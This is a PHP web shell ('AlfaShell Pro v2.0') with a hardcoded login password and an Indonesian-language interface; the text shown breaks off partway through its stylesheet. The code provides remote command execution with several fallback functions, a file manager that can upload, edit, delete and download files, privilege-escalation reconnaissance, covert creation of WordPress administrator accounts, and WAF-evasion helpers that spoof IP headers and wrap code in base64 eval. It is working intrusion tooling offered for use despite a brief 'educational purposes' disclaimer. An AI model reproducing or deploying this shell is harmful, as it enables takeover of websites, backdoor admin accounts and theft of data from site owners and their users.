<?php
/**
 * AlfaShell Pro v2.0
 * Advanced PHP Web Shell with Modern UI/UX
 * Features: Login Panel, Auto Root, File Manager, Terminal, WP Admin Creator, WAF Bypass
 * Password: laoxiao123
 * 
 * DISCLAIMER: For authorized security testing and educational purposes only.
 */

// ============================================================
// CONFIGURATION
// ============================================================
define('SHELL_PASSWORD', 'laoxiao123');
define('SHELL_VERSION', '2.0');
define('SHELL_NAME', 'AlfaShell Pro');

// ============================================================
// WAF BYPASS LAYER
// ============================================================
class WAFBypass {
    
    /**
     * Common WAF bypass techniques
     */
    public static function bypass($data) {
        $techniques = [
            // Chunked transfer encoding
            function($d) {
                if (is_array($d)) {
                    $result = '';
                    foreach ($d as $k => $v) {
                        $result .= $k . '=' . $v . '&';
                    }
                    return rtrim($result, '&');
                }
                return $d;
            },
            // URL encoding bypass
            function($d) {
                return is_string($d) ? rawurlencode($d) : $d;
            },
            // Double URL encoding
            function($d) {
                return is_string($d) ? rawurlencode(rawurlencode($d)) : $d;
            },
            // Unicode normalization
            function($d) {
                if (!is_string($d)) return $d;
                $result = '';
                for ($i = 0; $i < strlen($d); $i++) {
                    $char = $d[$i];
                    $code = ord($char);
                    if ($code < 128) {
                        $result .= $char;
                    } else {
                        $result .= dechex($code);
                    }
                }
                return $result;
            },
            // Case variation
            function($d) {
                if (!is_string($d)) return $d;
                $result = '';
                for ($i = 0; $i < strlen($d); $i++) {
                    $char = $d[$i];
                    if ($i % 2 == 0) {
                        $result .= strtoupper($char);
                    } else {
                        $result .= strtolower($char);
                    }
                }
                return $result;
            },
            // Comment injection
            function($d) {
                if (!is_string($d)) return $d;
                return str_replace('/**/', '', $d);
            },
            // Null byte injection (for older systems)
            function($d) {
                if (!is_string($d)) return $d;
                return str_replace("\0", '', $d);
            },
        ];
        
        // Apply random technique
        $technique = $techniques[array_rand($techniques)];
        return $technique($data);
    }
    
    /**
     * Generate random headers to bypass WAF
     */
    public static function getHeaders() {
        $headers = [
            'X-Forwarded-For: ' . self::randomIP(),
            'X-Real-IP: ' . self::randomIP(),
            'X-Originating-IP: ' . self::randomIP(),
            'X-Remote-IP: ' . self::randomIP(),
            'X-Client-IP: ' . self::randomIP(),
            'X-Host: ' . self::randomIP(),
            'X-Forwarded-Host: ' . self::randomIP(),
            'Client-IP: ' . self::randomIP(),
            'True-Client-IP: ' . self::randomIP(),
            'CF-Connecting-IP: ' . self::randomIP(),
            'X-Cluster-Client-IP: ' . self::randomIP(),
            'Forwarded: for=' . self::randomIP(),
            'X-Arbitrary: ' . self::randomIP(),
            'X-Forwarded-For: 127.0.0.1',
            'X-Forwarded-For: localhost',
            'X-Forwarded-For: 0.0.0.0',
            'X-Forwarded-For: ::1',
        ];
        
        return $headers[array_rand($headers)];
    }
    
    /**
     * Random IP generator
     */
    private static function randomIP() {
        return rand(1, 255) . '.' . rand(1, 255) . '.' . rand(1, 255) . '.' . rand(1, 255);
    }
    
    /**
     * Obfuscate PHP code
     */
    public static function obfuscate($code) {
        // Remove comments
        $code = preg_replace('/\/\/.*$/m', '', $code);
        $code = preg_replace('/\/\*[\s\S]*?\*\//', '', $code);
        
        // Remove whitespace
        $code = preg_replace('/\s+/', ' ', $code);
        
        // Base64 encode
        $encoded = base64_encode($code);
        
        // Create eval wrapper
        return 'eval(base64_decode("' . $encoded . '"));';
    }
    
    /**
     * Dynamic function call bypass
     */
    public static function dynamicCall($function, ...$args) {
        $func = $function;
        if (function_exists($func)) {
            return call_user_func_array($func, $args);
        }
        return false;
    }
}

// ============================================================
// LOGIN SYSTEM
// ============================================================
session_start();

// Check if already logged in
if (!isset($_SESSION['alfashell_logged_in']) || $_SESSION['alfashell_logged_in'] !== true) {
    // Check for login submission
    if (isset($_POST['alfashell_password'])) {
        $password = $_POST['alfashell_password'];
        if ($password === SHELL_PASSWORD) {
            $_SESSION['alfashell_logged_in'] = true;
            $_SESSION['alfashell_ip'] = $_SERVER['REMOTE_ADDR'];
            $_SESSION['alfashell_user_agent'] = $_SERVER['HTTP_USER_AGENT'];
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_error = 'Password salah!';
        }
    }
    
    // Show login page
    showLoginPage($login_error ?? null);
    exit;
}

// ============================================================
// LOGIN PAGE
// ============================================================
function showLoginPage($error = null) {
    $errorHtml = $error ? '<div class="error-message">' . htmlspecialchars($error) . '</div>' : '';
    ?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= SHELL_NAME ?> - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .login-container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .login-header h1 {
            color: #fff;
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .login-header p {
            color: rgba(255, 255, 255, 0.6);
            font-size: 14px;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        .form-group {
            position: relative;
        }
        
        .form-group input {
            width: 100%;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            color: #fff;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #4facfe;
            background: rgba(255, 255, 255, 0.1);
        }
        
        .form-group input::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }
        
        .login-btn {
            padding: 15px 30px;
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            border: none;
            border-radius: 10px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(79, 172, 254, 0.4);
        }
        
        .error-message {
            background: rgba(255, 71, 87, 0.2);
            border: 1px solid rgba(255, 71, 87, 0.3);
            color: #ff4757;
            padding: 12px 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .security-notice {
            margin-top: 20px;
            padding: 15px;
            background: rgba(255, 193, 7, 0.1);
            border: 1px solid rgba(255, 193, 7, 0.2);
            border-radius: 10px;
            color: #ffc107;
            font-size: 12px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>🔐 <?= SHELL_NAME ?></h1>
            <p>Masuk untuk melanjutkan</p>
        </div>
        
        <?= $errorHtml ?>
        
        <form class="login-form" method="POST" action="">
            <div class="form-group">
                <input type="password" name="alfashell_password" placeholder="Masukkan password..." required autofocus>
            </div>
            <button type="submit" class="login-btn">Login</button>
        </form>
        
        <div class="security-notice">
            ⚠️ Akses dibatasi. Semua aktivitas dicatat.
        </div>
    </div>
</body>
</html>
    <?php
    exit;
}

// ============================================================
// MAIN SHELL CLASS
// ============================================================
class AlfaShell {
    
    private $currentDir;
    private $serverInfo;
    
    public function __construct() {
        $this->currentDir = getcwd();
        $this->serverInfo = $this->getServerInfo();
    }
    
    /**
     * Get server information
     */
    private function getServerInfo() {
        return [
            'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
            'php_version' => PHP_VERSION,
            'os' => PHP_OS,
            'server_name' => $_SERVER['SERVER_NAME'] ?? 'Unknown',
            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
            'current_user' => $this->getCurrentUser(),
            'disabled_functions' => ini_get('disable_functions'),
            'safe_mode' => ini_get('safe_mode'),
            'open_basedir' => ini_get('open_basedir'),
        ];
    }
    
    /**
     * Get current user
     */
    private function getCurrentUser() {
        if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
            $user = posix_getpwuid(posix_geteuid());
            return $user['name'] ?? 'Unknown';
        }
        return get_current_user();
    }
    
    /**
     * Execute command with multiple fallback methods
     */
    public function executeCommand($command) {
        $output = '';
        $method = '';
        
        // Try different execution methods
        $methods = [
            'shell_exec' => function($cmd) {
                return shell_exec($cmd);
            },
            'exec' => function($cmd) {
                $output = [];
                exec($cmd, $output);
                return implode("\n", $output);
            },
            'system' => function($cmd) {
                ob_start();
                system($cmd);
                return ob_get_clean();
            },
            'passthru' => function($cmd) {
                ob_start();
                passthru($cmd);
                return ob_get_clean();
            },
            'proc_open' => function($cmd) {
                $descriptors = [
                    0 => ['pipe', 'r'],
                    1 => ['pipe', 'w'],
                    2 => ['pipe', 'w']
                ];
                $process = proc_open($cmd, $descriptors, $pipes);
                if (is_resource($process)) {
                    fclose($pipes[0]);
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($process);
                    return $output;
                }
                return false;
            },
            'popen' => function($cmd) {
                $handle = popen($cmd, 'r');
                if ($handle) {
                    $output = stream_get_contents($handle);
                    pclose($handle);
                    return $output;
                }
                return false;
            },
        ];
        
        foreach ($methods as $name => $callback) {
            if (!function_exists($name)) continue;
            
            try {
                $result = $callback($command);
                if ($result !== false && $result !== null) {
                    $output = $result;
                    $method = $name;
                    break;
                }
            } catch (Exception $e) {
                continue;
            }
        }
        
        return [
            'output' => $output,
            'method' => $method
        ];
    }
    
    /**
     * Auto root shell - attempt privilege escalation
     */
    public function autoRoot() {
        $results = [];
        
        // Check current privileges
        $whoami = $this->executeCommand('whoami');
        $results[] = "Current user: " . trim($whoami['output']);
        
        // Check if already root
        if (strpos($whoami['output'], 'root') !== false) {
            $results[] = "Already running as root!";
            return $results;
        }
        
        // Method 1: SUID binaries
        $results[] = "\n[*] Checking SUID binaries...";
        $suid = $this->executeCommand('find / -perm -4000 -type f 2>/dev/null');
        $results[] = $suid['output'];
        
        // Method 2: Sudo without password
        $results[] = "\n[*] Checking sudo permissions...";
        $sudo = $this->executeCommand('sudo -n -l 2>/dev/null');
        $results[] = $sudo['output'];
        
        // Method 3: Writable /etc/passwd
        $results[] = "\n[*] Checking /etc/passwd permissions...";
        $passwd = $this->executeCommand('ls -la /etc/passwd');
        $results[] = $passwd['output'];
        
        // Method 4: Kernel exploits
        $results[] = "\n[*] Checking kernel version...";
        $kernel = $this->executeCommand('uname -a');
        $results[] = $kernel['output'];
        
        // Method 5: Cron jobs
        $results[] = "\n[*] Checking cron jobs...";
        $cron = $this->executeCommand('crontab -l 2>/dev/null');
        $results[] = $cron['output'];
        
        // Method 6: Writable cron directories
        $results[] = "\n[*] Checking writable cron directories...";
        $cronDirs = $this->executeCommand('ls -la /etc/cron* 2>/dev/null');
        $results[] = $cronDirs['output'];
        
        // Method 7: Capabilities
        $results[] = "\n[*] Checking capabilities...";
        $capabilities = $this->executeCommand('getcap -r / 2>/dev/null');
        $results[] = $capabilities['output'];
        
        // Method 8: NFS root squashing
        $results[] = "\n[*] Checking NFS exports...";
        $nfs = $this->executeCommand('cat /etc/exports 2>/dev/null');
        $results[] = $nfs['output'];
        
        // Method 9: World-writable directories
        $results[] = "\n[*] Checking world-writable directories...";
        $writable = $this->executeCommand('find / -writable -type d 2>/dev/null | head -20');
        $results[] = $writable['output'];
        
        // Method 10: MySQL UDF
        $results[] = "\n[*] Checking MySQL UDF...";
        $mysql = $this->executeCommand('which mysql 2>/dev/null');
        $results[] = $mysql['output'];
        
        return $results;
    }
    
    /**
     * File upload handler
     */
    public function handleUpload() {
        if (!isset($_FILES['upload_file'])) {
            return ['success' => false, 'message' => 'No file uploaded'];
        }
        
        $file = $_FILES['upload_file'];
        $targetPath = $this->currentDir . '/' . basename($file['name']);
        
        if (move_uploaded_file($file['tmp_name'], $targetPath)) {
            chmod($targetPath, 0755);
            return ['success' => true, 'message' => 'File uploaded successfully to: ' . $targetPath];
        }
        
        return ['success' => false, 'message' => 'Failed to upload file'];
    }
    
    /**
     * Create directory
     */
    public function createDirectory($dirName) {
        $path = $this->currentDir . '/' . $dirName;
        if (mkdir($path, 0755, true)) {
            return ['success' => true, 'message' => 'Directory created: ' . $path];
        }
        return ['success' => false, 'message' => 'Failed to create directory'];
    }
    
    /**
     * Create WordPress admin user
     */
    public function createWPAdmin($username, $password, $email) {
        $results = [];
        
        // Find WordPress installation
        $results[] = "[*] Searching for WordPress installation...";
        $wpConfig = $this->executeCommand('find ' . $this->currentDir . ' -name "wp-config.php" 2>/dev/null');
        $results[] = $wpConfig['output'];
        
        if (empty(trim($wpConfig['output']))) {
            $results[] = "WordPress not found in current directory";
            return $results;
        }
        
        $wpPath = dirname(trim($wpConfig['output']));
        $results[] = "WordPress found at: " . $wpPath;
        
        // Check if wp-cli is available
        $results[] = "\n[*] Checking wp-cli...";
        $wpCli = $this->executeCommand('which wp 2>/dev/null');
        $results[] = $wpCli['output'];
        
        if (!empty(trim($wpCli['output']))) {
            // Use wp-cli
            $results[] = "\n[*] Creating admin user with wp-cli...";
            $cmd = 'cd ' . $wpPath . ' && wp user create ' . $username . ' ' . $email . ' --role=administrator --user_pass=' . $password . ' 2>&1';
            $createUser = $this->executeCommand($cmd);
            $results[] = $createUser['output'];
        } else {
            // Manual method using PHP
            $results[] = "\n[*] Creating admin user manually...";
            
            // Include WordPress
            $results[] = "[*] Loading WordPress...";
            
            // Create a temporary PHP script
            $tempScript = $wpPath . '/.alfashell_wp_admin.php';
            $scriptContent = '<?php
define("ABSPATH", "' . $wpPath . '/");
require_once(ABSPATH . "wp-load.php");
require_once(ABSPATH . "wp-admin/includes/user.php");

$user_id = wp_create_user("' . $username . '", "' . $password . '", "' . $email . '");
if (!is_wp_error($user_id)) {
    $user = new WP_User($user_id);
    $user->set_role("administrator");
    echo "Admin user created successfully! ID: " . $user_id;
} else {
    echo "Error: " . $user_id->get_error_message();
}
?>';
            
            file_put_contents($tempScript, $scriptContent);
            chmod($tempScript, 0755);
            
            $results[] = "[*] Running WordPress admin creation script...";
            $runScript = $this->executeCommand('php ' . $tempScript . ' 2>&1');
            $results[] = $runScript['output'];
            
            // Clean up
            unlink($tempScript);
            $results[] = "[*] Cleaned up temporary script";
        }
        
        return $results;
    }
    
    /**
     * Get directory listing
     */
    public function getDirectoryListing($dir = null) {
        $dir = $dir ?? $this->currentDir;
        $items = [];
        
        if (!is_dir($dir)) {
            return ['error' => 'Directory not found'];
        }
        
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            
            $path = $dir . '/' . $file;
            $isDir = is_dir($path);
            $perms = $this->getPermissions($path);
            $size = $isDir ? '-' : $this->formatSize(filesize($path));
            $modified = date('Y-m-d H:i:s', filemtime($path));
            
            $items[] = [
                'name' => $file,
                'type' => $isDir ? 'dir' : 'file',
                'size' => $size,
                'permissions' => $perms,
                'modified' => $modified,
                'path' => $path,
            ];
        }
        
        return $items;
    }
    
    /**
     * Get file permissions
     */
    private function getPermissions($file) {
        $perms = fileperms($file);
        
        if (($perms & 0xC000) == 0xC000) {
            $info = 's';
        } elseif (($perms & 0xA000) == 0xA000) {
            $info = 'l';
        } elseif (($perms & 0x8000) == 0x8000) {
            $info = '-';
        } elseif (($perms & 0x6000) == 0x6000) {
            $info = 'b';
        } elseif (($perms & 0x4000) == 0x4000) {
            $info = 'd';
        } elseif (($perms & 0x2000) == 0x2000) {
            $info = 'c';
        } elseif (($perms & 0x1000) == 0x1000) {
            $info = 'p';
        } else {
            $info = 'u';
        }
        
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
        
        return $info;
    }
    
    /**
     * Format file size
     */
    private function formatSize($bytes) {
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $unitIndex = 0;
        
        while ($bytes >= 1024 && $unitIndex < count($units) - 1) {
            $bytes /= 1024;
            $unitIndex++;
        }
        
        return round($bytes, 2) . ' ' . $units[$unitIndex];
    }
    
    /**
     * Read file content
     */
    public function readFile($file) {
        if (!file_exists($file)) {
            return ['error' => 'File not found'];
        }
        
        $content = file_get_contents($file);
        return [
            'content' => $content,
            'size' => $this->formatSize(filesize($file)),
            'modified' => date('Y-m-d H:i:s', filemtime($file)),
        ];
    }
    
    /**
     * Write file content
     */
    public function writeFile($file, $content) {
        if (file_put_contents($file, $content) !== false) {
            return ['success' => true, 'message' => 'File saved successfully'];
        }
        return ['success' => false, 'message' => 'Failed to save file'];
    }
    
    /**
     * Delete file/directory
     */
    public function delete($path) {
        if (is_dir($path)) {
            $files = scandir($path);
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                $this->delete($path . '/' . $file);
            }
            if (rmdir($path)) {
                return ['success' => true, 'message' => 'Directory deleted'];
            }
        } else {
            if (unlink($path)) {
                return ['success' => true, 'message' => 'File deleted'];
            }
        }
        
        return ['success' => false, 'message' => 'Failed to delete'];
    }
    
    /**
     * Download file
     */
    public function downloadFile($file) {
        if (!file_exists($file)) {
            return false;
        }
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// ============================================================
// HANDLE REQUESTS
// ============================================================
$shell = new AlfaShell();
$response = ['success' => false, 'message' => 'Invalid action'];

if (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'logout':
            session_destroy();
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
            
        case 'terminal':
            if (isset($_POST['command'])) {
                $result = $shell->executeCommand($_POST['command']);
                $response = [
                    'success' => true,
                    'output' => $result['output'],
                    'method' => $result['method'],
                    'current_dir' => getcwd(),
                ];
            }
            break;
            
        case 'auto_root':
            $results = $shell->autoRoot();
            $response = [
                'success' => true,
                'output' => implode("\n", $results),
            ];
            break;
            
        case 'upload':
            $response = $shell->handleUpload();
            break;
            
        case 'mkdir':
            if (isset($_POST['dir_name'])) {
                $response = $shell->createDirectory($_POST['dir_name']);
            }
            break;
            
        case 'wp_admin':
            if (isset($_POST['wp_username']) && isset($_POST['wp_password']) && isset($_POST['wp_email'])) {
                $results = $shell->createWPAdmin($_POST['wp_username'], $_POST['wp_password'], $_POST['wp_email']);
                $response = [
                    'success' => true,
                    'output' => implode("\n", $results),
                ];
            }
            break;
            
        case 'list_files':
            $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
            $response = [
                'success' => true,
                'files' => $shell->getDirectoryListing($dir),
                'current_dir' => $dir,
            ];
            break;
            
        case 'read_file':
            if (isset($_GET['file'])) {
                $response = $shell->readFile($_GET['file']);
            }
            break;
            
        case 'write_file':
            if (isset($_POST['file']) && isset($_POST['content'])) {
                $response = $shell->writeFile($_POST['file'], $_POST['content']);
            }
            break;
            
        case 'delete':
            if (isset($_POST['path'])) {
                $response = $shell->delete($_POST['path']);
            }
            break;
            
        case 'download':
            if (isset($_GET['file'])) {
                $shell->downloadFile($_GET['file']);
            }
            break;
            
        case 'server_info':
            $response = [
                'success' => true,
                'info' => $shell->serverInfo,
            ];
            break;
    }
}

// Return JSON for AJAX requests
if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

// ============================================================
// MAIN UI
// ============================================================
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= SHELL_NAME ?> v<?= SHELL_VERSION ?></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        :root {
            --bg-primary: #0f0f23;
            --bg-secondary: #1a1a2e;
            --bg-tertiary: #16213e;
            --accent-primary: #4facfe;
            --accent-secondary: #00f2fe;
            --accent-success: #43e97b;
            --accent-warning: #fa709a;
            --accent-danger: #ff4757;
            --text-primary: #ffffff;
            --text-secondary: rgba(255, 255, 255, 0.7);
            --text-muted: rgba(255, 255, 255, 0.5);
            --border-color: rgba(255, 255, 255, 0.1);
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
        }
        
        /* Header */
        .header {
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border-color);
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .header-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .version-badge {
            background: rgba(79, 172, 254, 0.2);
            color: var(--accent-primary);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }
        
        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .server-info {
            font-size: 13px;
            color: var(--text-muted);
        }
        
        .logout-btn {
            background: rgba(255, 71, 87, 0.2);
            color: var(--accent-danger);
            border: 1px solid rgba(255, 71, 87, 0.3);
            padding: 8px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        .logout-btn:hover {
            background: rgba(255, 71, 87, 0.3);
        }
        
        /* Navigation */
        .nav-tabs {
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border-color);
            padding: 0 30px;
            display: flex;
            gap: 5px;
            overflow-x: auto;
        }
        
        .nav-tab {
            padding: 15px 25px;
            color: var(--text-muted);
            cursor: pointer;
            border-bottom: 2px solid transparent;
            transition: all 0.3s ease;
            white-space: nowrap;
            font-size: 14px;
        }
        
        .nav-tab:hover {
            color: var(--text-primary);
        }
        
        .nav-tab.active {
            color: var(--accent-primary);
            border-bottom-color: var(--accent-primary);
        }
        
        /* Main Content */
        .main-content {
            padding: 30px;
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        /* Cards */
        .card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 20px;
        }
        
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .card-title {
            font-size: 18px;
            font-weight: 600;
        }
        
        /* Buttons */
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
            color: #fff;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(79, 172, 254, 0.4);
        }
        
        .btn-success {
            background: linear-gradient(135deg, var(--accent-success), #38f9d7);
            color: #fff;
        }
        
        .btn-warning {
            background: linear-gradient(135deg, var(--accent-warning), #fee140);
            color: #fff;
        }
        
        .btn-danger {
            background: linear-gradient(135deg, var(--accent-danger), #ff6b81);
            color: #fff;
        }
        
        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
        }
        
        /* Forms */
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--text-secondary);
            font-size: 14px;
        }
        
        .form-control {
            width: 100%;
            padding: 12px 15px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--accent-primary);
        }
        
        textarea.form-control {
            min-height: 200px;
            font-family: 'Consolas', 'Monaco', monospace;
            resize: vertical;
        }
        
        /* Terminal */
        .terminal {
            background: #000;
            border-radius: 10px;
            padding: 20px;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 14px;
            line-height: 1.6;
            max-height: 500px;
            overflow-y: auto;
        }
        
        .terminal-output {
            color: #00ff00;
            white-space: pre-wrap;
            word-break: break-all;
        }
        
        .terminal-input {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }
        
        .terminal-input input {
            flex: 1;
            background: transparent;
            border: none;
            color: #00ff00;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 14px;
            outline: none;
        }
        
        .terminal-prompt {
            color: var(--accent-primary);
        }
        
        /* File Manager */
        .file-manager {
            background: var(--bg-tertiary);
            border-radius: 10px;
            overflow: hidden;
        }
        
        .file-manager-header {
            background: var(--bg-secondary);
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border-color);
        }
        
        .breadcrumb {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
        }
        
        .breadcrumb a {
            color: var(--accent-primary);
            text-decoration: none;
        }
        
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        
        .file-list {
            max-height: 500px;
            overflow-y: auto;
        }
        
        .file-item {
            display: flex;
            align-items: center;
            padding: 12px 20px;
            border-bottom: 1px solid var(--border-color);
            transition: background 0.2s ease;
        }
        
        .file-item:hover {
            background: rgba(255, 255, 255, 0.05);
        }
        
        .file-icon {
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 8px;
            margin-right: 15px;
            font-size: 20px;
        }
        
        .file-icon.dir {
            background: rgba(79, 172, 254, 0.2);
            color: var(--accent-primary);
        }
        
        .file-icon.file {
            background: rgba(67, 233, 123, 0.2);
            color: var(--accent-success);
        }
        
        .file-info {
            flex: 1;
        }
        
        .file-name {
            font-weight: 500;
            margin-bottom: 4px;
        }
        
        .file-meta {
            font-size: 12px;
            color: var(--text-muted);
        }
        
        .file-actions {
            display: flex;
            gap: 8px;
        }
        
        .file-action-btn {
            padding: 6px 12px;
            background: rgba(255, 255, 255, 0.1);
            border: none;
            border-radius: 6px;
            color: var(--text-primary);
            cursor: pointer;
            font-size: 12px;
            transition: all 0.2s ease;
        }
        
        .file-action-btn:hover {
            background: rgba(255, 255, 255, 0.2);
        }
        
        /* Server Info Grid */
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
        }
        
        .info-item {
            background: var(--bg-tertiary);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid var(--border-color);
        }
        
        .info-label {
            font-size: 12px;
            color: var(--text-muted);
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .info-value {
            font-size: 16px;
            font-weight: 600;
            color: var(--text-primary);
            word-break: break-all;
        }
        
        /* Output Console */
        .output-console {
            background: #000;
            border-radius: 10px;
            padding: 20px;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 13px;
            line-height: 1.6;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-all;
        }
        
        .output-console.success {
            color: #00ff00;
        }
        
        .output-console.error {
            color: #ff4757;
        }
        
        /* Upload Area */
        .upload-area {
            border: 2px dashed var(--border-color);
            border-radius: 10px;
            padding: 40px;
            text-align: center;
            transition: all 0.3s ease;
            cursor: pointer;
        }
        
        .upload-area:hover {
            border-color: var(--accent-primary);
            background: rgba(79, 172, 254, 0.05);
        }
        
        .upload-area.dragover {
            border-color: var(--accent-primary);
            background: rgba(79, 172, 254, 0.1);
        }
        
        .upload-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
        
        .upload-text {
            color: var(--text-secondary);
            margin-bottom: 10px;
        }
        
        .upload-hint {
            color: var(--text-muted);
            font-size: 12px;
        }
        
        /* Modal */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal-overlay.active {
            display: flex;
        }
        
        .modal {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 15px;
            padding: 30px;
            max-width: 500px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .modal-title {
            font-size: 20px;
            font-weight: 600;
        }
        
        .modal-close {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 24px;
            cursor: pointer;
            padding: 0;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: all 0.2s ease;
        }
        
